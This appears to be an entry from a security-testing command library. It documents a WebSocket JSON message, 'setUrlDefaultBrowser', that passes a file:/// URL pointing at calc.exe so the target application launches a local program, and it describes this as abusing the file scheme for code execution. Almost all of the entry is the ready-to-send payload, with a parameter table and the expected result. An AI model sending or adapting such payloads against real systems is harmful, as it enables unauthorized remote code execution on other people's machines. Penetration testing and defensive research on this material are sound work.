---
data: >-
  {"command":"setUrlDefaultBrowser","params":{"url":"file:///c:/windows/system32/calc.exe"},"source":"QAS","target":"AGL"}
tags:
  - websocket
  - rce
type: command
executor: json
platforms:
  - Windows
id: 0d94df49-a2d0-485a-9509-347ea3430ce2
created_at: '2025-12-11T03:47:56.463Z'
updated_at: '2025-12-11T03:47:56.464Z'
verified: false
validated: true
submitted: true
---
# websocket-seturldefaultbrowser-calc

## Command

```json
{"command":"setUrlDefaultBrowser","params":{"url":"file:///c:/windows/system32/calc.exe"},"source":"QAS","target":"AGL"}
```

## Description

WebSocket command to open a file in the default handler, abusing file scheme to execute local applications like calc.exe.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `command` | setUrlDefaultBrowser | Yes |
| `params.url` | The URL or file path | Yes |
| `source` | QAS | Yes |
| `target` | AGL | Yes |

## Examples

### Basic Usage

```json
{"command":"setUrlDefaultBrowser","params":{"url":"file:///c:/windows/system32/calc.exe"},"source":"QAS","target":"AGL"}
```

## Expected Output

Executes the specified file, launching calc.exe.

## Related

- [[procedures/Test-Arbitrary-URL-Loading-via-WebSocket]]
